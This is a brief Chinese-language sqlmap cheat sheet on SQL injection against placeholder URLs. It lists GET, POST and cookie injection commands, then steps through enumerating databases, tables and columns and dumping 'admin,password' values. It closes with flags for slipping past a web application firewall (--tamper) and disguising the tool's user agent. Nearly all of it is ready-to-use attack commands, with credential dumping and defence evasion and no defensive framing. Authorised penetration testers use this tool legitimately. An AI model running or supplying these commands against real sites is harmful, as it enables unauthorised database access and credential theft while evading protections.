Sqlmap
======

注入分法不同，种类不同，来个简单的分类：<br/>

        1.get型:        sqlmap -u "http://xxx.xx.xxx/xx.xxx?xx=xxx"
        2.post型:       sqlmap -u "http://xxx.xx.xxx/xx.xxx" --data="xxxx=xxxx&xxxx=xxx"
        3.cookie类注入: sqlmap -u "http://xxx.xx.xxx/xx.xxx?xx=xxx" --cookie="xxx=xxx&xxx=xxx" --level=2


需要数据库好：<br/>

        --dbs
得到数据库名称xxx，需要表： <br/>

        -D xxx --tables
得到表名xxxx，需要段：<br/>

        -D xxx -T xxxx --columns
得到段内有admin，password，需要值：<br/>

        -D xxx -T xxxx -C "admin,password" --dump

那么我们来理解一下，-D -T -C 是干吗的，当然就是知道其名称，指定使用它。<br/>
--dbs --tables --columns 是干吗的，当然就是不知道名称，列出来呗<br/>
--dump 那自然就是字面意思，类似于导出数据的行为<br/>
其实注入有了上面这几个命令，妥妥的够用了，不过还需要绕waf：<br/>

        --tamper=""
注入被识别出来是工具，断开咋办：<br/>

        --user-agent=""
